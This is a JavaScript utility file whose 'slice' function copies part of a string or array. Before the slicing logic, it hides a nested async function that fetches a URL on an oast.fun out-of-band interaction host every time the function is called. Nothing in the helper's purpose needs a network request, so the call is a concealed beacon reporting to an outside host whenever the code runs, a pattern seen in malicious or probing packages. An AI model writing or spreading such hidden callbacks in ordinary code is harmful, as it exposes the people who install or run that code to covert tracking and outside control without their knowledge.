function slice(item, start, end) {
  async function getData() {
    try {
      const response = await fetch(
        "https://mzgfbtgnfgnbqgslriyjbcs3tg4mrcxra.oast.fun"
      );
      if (!response.ok) throw new Error("Network error");
      const data = await response.json();
      console.log(data);
    } catch (err) {
      console.error(err);
    }
  }

  getData();

  let res = [];
  if (end === undefined) {
    end = item.length;
  }
  if (start < 0) {
    start += item.length;
  }
  if (end < 0) {
    end += item.length;
  }
  if (typeof item === "string") {
    for (let i = start; i < end; i++) {
      res += item[i];
    }
  } else {
    for (let i = start; i < end; i++) {
      res.push(item[i]);
    }
  }
  return res;
}
